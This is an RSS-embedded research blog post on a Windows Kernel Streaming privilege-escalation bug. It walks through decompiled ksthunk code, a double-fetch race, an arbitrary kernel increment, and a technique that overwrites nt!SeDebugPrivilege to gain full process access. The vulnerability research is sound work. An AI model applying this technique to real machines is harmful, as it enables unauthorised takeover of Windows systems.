&lt;h2 id=&quot;proxying-to-kernel-again-&quot;&gt;Proxying to kernel again !&lt;/h2&gt;

&lt;p&gt;This time, the issue occurs when¬†&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt;¬†converts a 32-bit request into a 64-bit one.&lt;/p&gt;

&lt;p&gt;As shown in the figure below, when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; receives an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt; request and the request is from a WoW64 Process, it will perform the conversion from a 32-bit structure to a 64-bit structure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The conversion would call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; to handle it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) 
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28);  //------------------------[1]
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  //-----------------[2]
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt;, a similar bug pattern is clearly visible. You can see that during the processing, the original request is first copied into a newly allocated buffer at [1]. Subsequently, this buffer is used to call the new IOCTL using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; at [2]. Both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newinputbuf&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OutBuffer&lt;/code&gt; are controlled by the user.&lt;/p&gt;

&lt;p&gt;The flow when calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; is illustrated as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When calling IOCTL in a WoW64 process, you can see in step 2 of the diagram that the I/O Manager sets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; to UserMode(1). In step 3, ksthunk converts the user‚Äôs request from 32-bit to 64-bit, handled by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Afterward, in step 5, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; will be called to issue the IOCTL, and at this point, the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; has become &lt;strong&gt;KernelMode(0)&lt;/strong&gt;. The subsequent processing is the same as a typical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt;, so it won‚Äôt be detailed further. In summary, we now have a primitive that allows us to perform arbitrary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt; with KernelMode. Next, we need to look for places where we can achieve EoP.&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The Exploitation&lt;/h2&gt;
&lt;p&gt;Following the &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/#the-eop&quot;&gt;previous approach&lt;/a&gt;, we first analyzed the entry point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt;. However, after searching for a while, we found no potential privilege escalation points. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt;, most instances where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestMode&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt; are directly passed down without additional processing. Therefore, we shifted our eyes to the next layer, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks&lt;/code&gt;, to see if there are any opportunities for privilege escalation during the event handling process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quickly, we found a place that caught our attention.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KspEnableEvent&lt;/code&gt; handler, a code snippet first checks the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NotificationType&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENTDATA&lt;/code&gt; you passed in to determine how to register and handle your event. In general, it usually provides an &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa&quot;&gt;EVENT_HANDLE&lt;/a&gt; or a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createsemaphorea&quot;&gt;SEMAPHORE_HANDLE&lt;/a&gt;. However, in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks&lt;/code&gt;, if called from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;, we can provide an &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/event-objects&quot;&gt;Event Object&lt;/a&gt; or even a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-dpc-objects&quot;&gt;DPC Object&lt;/a&gt; to register your event, making the overall handling more efficient.&lt;/p&gt;

&lt;p&gt;This means we can use this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; primitive to provide a &lt;strong&gt;kernel object&lt;/strong&gt; for subsequent processing. If constructed well, it might achieve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EoP&lt;/code&gt;, but it depends on how this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object&lt;/code&gt; is used later.&lt;/p&gt;

&lt;p&gt;However, after trying for a while, we discovered that ‚Ä¶&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  //-------[3]
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) //-------[4]
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28); //------[5] 
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you want to provide a kernel object to register an event, then the flag given in the IOCTL for &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksevent-structure&quot;&gt;KSEVENT&lt;/a&gt; must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt; at [3]. However, at [4], where the vulnerability is triggered, it must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;, and it is impossible to directly provide a kernel object as we might have expected.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fortunately, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt; also uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Neither I/O&lt;/code&gt; to transmit data. It also presents a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Double Fetch&lt;/code&gt; issue &lt;strong&gt;again&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure above, we can set the flag to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt; before calling IOCTL. When checking, it will handle it with  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;. Before the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; call, we can change the flag to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This way, we can successfully trigger the vulnerability and construct a specific kernel object to register the event.&lt;/p&gt;

&lt;h3 id=&quot;trigger-the-event&quot;&gt;Trigger the event&lt;/h3&gt;
&lt;p&gt;When would it use the kernel object that you constructed? When an event is triggered, ks will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!ksGenerateEvent&lt;/code&gt; through DPC. At this point, it will determine how to handle your event based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NotificationType&lt;/code&gt; you specified.&lt;/p&gt;

&lt;p&gt;Let‚Äôs take a look at KsGenerateEvent&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;NTSTATUS __stdcall KsGenerateEvent(PKSEVENT_ENTRY EventEntry)
{

  switch ( EventEntry-&amp;gt;NotificationType )
  {
    case KSEVENTF_DPC:
      ...
      if ( !KeInsertQueueDpc(EventEntry-&amp;gt;EventData-&amp;gt;Dpc.Dpc, EventEntry-&amp;gt;EventData, 0LL) )
        _InterlockedAdd(&amp;amp;EventEntry-&amp;gt;EventData-&amp;gt;EventObject.Increment, 0xFFFFFFFF); //--------[6]
      ...
    case KSEVENTF_KSWORKITEM:
      ...
      KsIncrementCountedWorker(eventdata-&amp;gt;KsWorkItem.KsWorkerObject); //-----------[7]

  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this point, there are multiple ways to exploit this. The most straightforward method is to directly construct a DPC structure and queue a DPC to achieve arbitrary kernel code execution, which corresponds to the code snippet at [6]. However, the IRQL when calling KsGenerateEvent is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt;, making it very difficult to construct a DPC object in User space, and the exploitation process will encounter many issues.&lt;/p&gt;

&lt;p&gt;Therefore, we opt for an alternative route using¬†&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENTF_KSWORKITEM&lt;/code&gt;¬†at [7]. This method involves passing in a kernel address and manipulating it to be recognized as a pointer to¬†&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata&quot;&gt;KSWORKITEM&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It can achieve an arbitrary kernel address increment by one. The entire process is illustrated in the diagram below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt;, after constructing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENTDATA&lt;/code&gt; to point to a kernel memory address, ks will handle it as a kernel object and register the specified event.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When triggered, ks will increment the content at our provided memory address. Therefore, we have a kernel arbitrary increment primitive here.&lt;/p&gt;

&lt;h3 id=&quot;arbitrary-increment-primitive-to-eop&quot;&gt;Arbitrary increment primitive to EoP&lt;/h3&gt;
&lt;p&gt;From arbitrary increment primitive to EoP, there are many methods that can be exploited, among which the most well-known are &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abuse token privilege&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing&lt;/code&gt;&lt;/a&gt;. Initially, it seemed like this would be the end of it.&lt;/p&gt;

&lt;p&gt;However, both of these methods have certain limitations in this situation:&lt;/p&gt;

&lt;h4 id=&quot;abuse-token-privilege&quot;&gt;Abuse token Privilege&lt;/h4&gt;
&lt;p&gt;If we use the method of abusing token privilege for EoP, the key lies of the technique in overwriting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Enable&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Present&lt;/code&gt;. Since our vulnerability can only be incremented by one at a time, both fields need to be written to obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;. The default values for these two fields are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x602880000&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000&lt;/code&gt;, which need to be changed to 0x602&lt;strong&gt;9&lt;/strong&gt;80000 and 0x&lt;strong&gt;9&lt;/strong&gt;00000. This means each field needs to be written 0x10 times, totaling 0x20 writes. Each write requires a race condition, which takes times and significantly reduces stability.&lt;/p&gt;

&lt;h4 id=&quot;ioring&quot;&gt;IoRing&lt;/h4&gt;
&lt;p&gt;Using IoRing to achieve arbitrary writing might be a simpler method. To achieve arbitrary write, you just need to overwrite¬†&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffersCount&lt;/code&gt;¬†and¬†&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffers&lt;/code&gt;. However, a problem arises.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When triggering the arbitrary increment, if the original value is 0, it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsQueueWorkItem&lt;/code&gt;, where some corresponding complex processing will occur, leading to BSoD. The exploitation method of IoRing happens to encounter this situation‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Is it really impossible to exploit it stably?&lt;/p&gt;

&lt;h4 id=&quot;lets-find-a-new-way-&quot;&gt;Let‚Äôs find a new way !&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;When traditional exploitation methods hit a roadblock, it might be worthwhile to dive deeper into the core mechanics of the technique. You may unexpectedly discover new approaches along the way.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After several days of contemplation, we decided to seek a new approach. However, starting from scratch might take considerable time and may not yield results. Therefore, we chose to derive new inspiration from two existing methods. First, let‚Äôs look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abusing token privilege&lt;/code&gt;. The key aspect here is exploiting a vulnerability to obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;, allowing us to open high-privilege processes such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winlogon&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The question arises: why does having &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt; allow you to open high-privilege processes?&lt;/p&gt;

&lt;p&gt;We need to take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!PsOpenProcess&lt;/code&gt; first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From this code snippet, we can see that when we open the process, the kernel will use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-sesingleprivilegecheck&quot;&gt;SeSinglePrivilegeCheck&lt;/a&gt; to check if you have SeDebugPrivilege. If you have it, you will be granted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt; permission, allowing you to perform any action on any process except PPL. As the name implies, it is intended for debugging purposes. However, it is worth noting that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; is a global variable in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It‚Äôs a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-luid&quot;&gt;LUID&lt;/a&gt; structure that was initialized at system startup. The actual value is 0x14, indicating which bit in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Enable&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Present&lt;/code&gt; fields represent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;. Therefore, when we use NtOpenProcess, the system reads the value in this global variable&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; is obtained, it will be used to inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges&lt;/code&gt; field in the Token to see if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Present&lt;/code&gt; fields are set. For &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;, it will check the 0x14 bit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, there is an interesting thing‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The global variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; is located in a writable section!&lt;/p&gt;

&lt;p&gt;A new idea was born.&lt;/p&gt;

&lt;h4 id=&quot;make-abusing-token-privilege-great-again-&quot;&gt;Make abusing token privilege great again !&lt;/h4&gt;
&lt;p&gt;By default, a normal user will have only a limited number of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges&lt;/code&gt;, as shown in this diagram.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can notice that in most cases, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt; is enabled. At this point, we can look at the initialization part and find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt; represents the value 0x17.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What would happen if we use the vulnerability to change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; from 0x14 to 0x17?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure, in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtOpenProcess&lt;/code&gt; flow, it will first get the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt;, and at this time the obtained value is 0x17 (SeChangeNotifyPrivilege)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next check will verify the current process token using 0x17 to see if it has this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privilege&lt;/code&gt;. However, normal users generally have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt;, so even if you don‚Äôt have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;, you will still pass the check and obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt;. In other words, anyone with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt; can open a high-privilege process except PPL.&lt;/p&gt;

&lt;p&gt;Furthermore, by using the vulnerability mentioned above, we can change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; from &lt;strong&gt;0x14 to 0x17&lt;/strong&gt;. Since the original value is not 0, it will not be affected by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsQueueWorkItem&lt;/code&gt;, making it highly suitable for our purposes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we can open a high-privilege process, the privilege escalation method is the same as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abuse token privilege&lt;/code&gt; approach so that we won‚Äôt elaborate on that here. Ultimately, we successfully achieved EoP on Windows 11 23H2 by again utilizing Proxying to kernel.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/m2TNVDgz7CI?si=YJQ9_u7xoyVt1wRm&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;remark&quot;&gt;Remark&lt;/h4&gt;
&lt;p&gt;Actually, this technique also applies to other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privilege&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;SeTcbPrivilege = 0x7&lt;/li&gt;
  &lt;li&gt;SeTakeOwnershipPrivilege = 0x9&lt;/li&gt;
  &lt;li&gt;SeLoadDriverPrivilege = 0xa&lt;/li&gt;
  &lt;li&gt;‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;the-next--summary&quot;&gt;The Next &amp;amp; Summary&lt;/h2&gt;

&lt;p&gt;The focus of these two articles is primarily on how we analyze past vulnerabilities to discover new ones, how we gain new ideas from previous research, find new exploitation methods, new vulnerabilities, and new attack surfaces.&lt;/p&gt;

&lt;p&gt;There may still be many security issues of this bug class, and they might not be limited to Kernel Streaming and &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt;. I believe this is a design flaw in Windows, and if we search carefully, we might find more vulnerabilities.&lt;/p&gt;

&lt;p&gt;For this type of vulnerability, you need to pay attention to the timing of setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt;. If it is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; and then user input is used, issues may arise. Moreover, this type of vulnerability is often very exploitable.&lt;/p&gt;

&lt;p&gt;In Kernel Streaming, I believe there are quite a few potential security vulnerabilities. There are also many components like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hdaudio.sys&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Usbvideo.sys&lt;/code&gt; that might be worth examining and are suitable places for fuzzing. If you are a kernel driver developer, it is best not to only check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; . There might still be issues within the Windows architecture. Finally, I strongly recommend everyone to update Windows to the latest version as soon as possible.&lt;/p&gt;

&lt;h2 id=&quot;is-that-the-end-of-it-&quot;&gt;Is that the end of it ?&lt;/h2&gt;
&lt;p&gt;Apart from proxy-based vulnerabilities, we have also identified many other bug classes, allowing us to discover over 20 vulnerabilities in Kernel Streaming. Some of these vulnerabilities are quite unique, so stay tuned for Part III.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Easy Local Windows Kernel Exploitation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/</link>
                <guid>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en</guid>
                <pubDate>Sat, 05 Oct 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
